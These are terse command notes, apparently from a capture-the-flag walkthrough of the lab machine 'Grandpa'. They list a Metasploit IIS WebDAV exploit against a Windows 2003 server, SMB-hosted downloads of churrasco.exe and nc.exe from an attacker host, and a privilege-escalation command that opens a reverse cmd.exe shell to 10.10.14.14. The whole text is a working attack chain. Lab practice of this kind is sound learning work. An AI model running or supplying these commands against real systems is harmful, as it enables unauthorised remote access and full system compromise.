```
Window 2003 Server

msfconsole

use windows/iis/iis_webdav_scstoragepathfromurl

set rhosts grandpa.htb

set lhost tun0

exploit


#open smb on localhost current directory
sudo smbserver.py share .

#copy is window command to download smb file
copy \\10.10.14.14\share\churrasco.exe c.exe

copy \\10.10.14.14\share\nc.exe nc.exe

c.exe -d "C:\windows\temp\nc.exe -e cmd.exe 10.10.14.14  5678"

nc -nlvp 5678


netstat -ano | findstr "LISTEN"

```
